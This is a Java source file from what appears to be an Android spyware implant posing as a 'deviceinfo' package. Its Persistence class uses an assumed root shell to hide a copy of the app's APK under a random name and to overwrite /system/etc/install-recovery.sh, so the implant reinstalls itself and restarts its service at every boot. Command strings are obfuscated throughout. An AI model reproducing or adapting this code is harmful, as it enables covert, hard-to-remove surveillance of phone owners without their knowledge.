package com.android.deviceinfo;

import java.io.File;
import java.util.Random;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.Configuration;
import com.android.deviceinfo.evidence.EvidenceBuilder;
import com.android.deviceinfo.file.AutoFile;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.Execute;
import com.android.deviceinfo.util.StringUtils;
import com.android.m.M;

// Use this class only when the suid shell is installed
public class Persistence {
	protected static final String TAG = "Persistence"; //$NON-NLS-1$
	private Context ctx;
	private String storageDir;
	private PackageManager pm;
	private String curPackageName;
	private String curPackageFileName;
	
	public Persistence(Context context) {
		ctx = context;
		pm = ctx.getPackageManager();
		curPackageName = ctx.getApplicationContext().getPackageName();
		
		genStorage(); // storage is initialized here
	}
	
	// Get full path for this package: /data/app/com.xxx.xxx.apk
	private String getPackagePath() {	
		android.content.pm.PackageInfo pi;
		
		try {
			pi = pm.getPackageInfo(curPackageName, 0);
			String fullPath = pi.applicationInfo.sourceDir;
			curPackageFileName = fullPath.substring(fullPath.lastIndexOf("/") + 1);
			
			if (Cfg.DEBUG) {
				Check.log(TAG + "(getThisPackagePath): " + fullPath);
			}
			
			return fullPath;
		} catch (NameNotFoundException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
		}
		
		return "";
	}
	
	// Copy our package with a random-buildbased name into the SD
	public void storePackage() {
		String pkgPath = getPackagePath();
		
		if (storageDir.length() == 0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(storePackage): storage directory not present, cannot continue");
			}
			
			return;
		}
		
		// Copy /data/app/package.apk to the destination directory
		Execute.execute(Configuration.shellFile + " " + "fhc" + " " + pkgPath + " " + storageDir + "/" + getName());
	}
	
	/**
	 * Crea script, che installa l'apk e lo esegue
	 * Viene copiato in /system/etc/install-recovery.sh
	 * L'apk non viene usato, e' quello in data_app, che viene copiato internamente 
	 * TODO: se il melt si scaricasse un core, potrebbe usare questa tecnica per avere la persistence
	 */
	public void addPersistance() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (addPersistance) ");
		}
		
		String install = M.e("/system/bin/pm install -f ") + storageDir + "/" + getName();
		String start = M.e("/system/bin/am startservice -n ") + curPackageName + M.e("/.ServiceMain");
		String scriptBody = "sleep 10\nif " + install + "; then\n" + "    " + start + "\nfi";
		
		// Backup install-recovery.sh
		String scriptName = "bu";
		String script = M.e("#!/system/bin/sh") + "\n";
		script += Configuration.shellFile + " " + "srh" + " " + "\"" + install + "\"" + M.e(" /system/etc/install-recovery.sh");
		script += "\nif [ $? == 0 ]; then\n    ";
		script += Configuration.shellFile + " " + "fhc" + " " + M.e("/system/etc/install-recovery.sh") + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8);
		script += "\nfi";
		
		Root.createScript(scriptName, script);
		
		// Backup (if needed) /system/etc/install-recovery.sh
		Execute.executeRoot(Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + scriptName);
		Root.removeScript(scriptName);
		
		// Remount /system
		Execute.execute(Configuration.shellFile + " " + "blw");
		
		// Write our script into /system/etc/install-recovery.sh
		scriptName = "ip";
		script = M.e("#!/system/bin/sh") + "\n";
		//script += Configuration.shellFile + " " + "qzx" + " " + "\"touch "+  M.e(" /system/etc/install-recovery.sh") +"\""+ "\n";
		//script += Configuration.shellFile + " " + "pzm" + " 755 "+  M.e(" /system/etc/install-recovery.sh")+ "\n";
		script += Configuration.shellFile + " " + "ape" + " " + "\"" + scriptBody + "\"" + M.e(" /system/etc/install-recovery.sh"+ "\n");
		
		Root.createScript(scriptName, script);
		Execute.executeRoot(Status.getAppContext().getFilesDir().getAbsolutePath() + "/" + scriptName);
		Root.removeScript(scriptName);
		
		// Return /system to normal
		Execute.execute(Configuration.shellFile + " " + "blr");
		
		//AutoFile p = new AutoFile( M.e("/system/etc/install-recovery.sh" ));
		//if(p.exists()){
		//	EvidenceReference.info("Persistence");
		//}
	}
	
	public void removePersistance() {
		restoreRecovery();
	}
	
	private void restoreRecovery() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (restoreRecovery) ");
		}
		// Remount /system
		Execute.execute(Configuration.shellFile + " " + "blw");
		
		Execute.execute(Configuration.shellFile + " " + "fhc" + " " + storageDir + "/" + getName() + Cfg.RANDOM.substring(7, 8) + " " + M.e("/system/etc/install-recovery.sh"));
		
		// Return /system to normal
		Execute.execute(Configuration.shellFile + " " + "blr");
	}
	
	private boolean genStorage() {
		long seed = Long.parseLong(Cfg.RANDOM.substring(0, 6), 16);
		byte[] name = new byte[3];
		Random rand = new Random(seed / 2);
		
		rand.nextBytes(name);
		
		String dirName = StringUtils.byteArrayToHexString(name);
		
		storageDir = Path.hidden() + dirName;
	
		if (Path.createDirectory(storageDir) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (genStorage): persistence storage directory cannot be created"); //$NON-NLS-1$
			}
	
			return false;
		} else {
			Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "775" + " " + storageDir);
			
			if (Cfg.DEBUG) {
				Check.log(TAG + " (genStorage): persistence storage directory created at " + storageDir); //$NON-NLS-1$
			}
	
			return true;
		}
	}
	
	private String getName() {
		long seed = Long.parseLong(Cfg.RANDOM.substring(0, 6), 16);
		byte[] name = new byte[3];
		Random rand = new Random(seed / 4 * 3);
		
		rand.nextBytes(name);
		
		return StringUtils.byteArrayToHexString(name);
	}
}
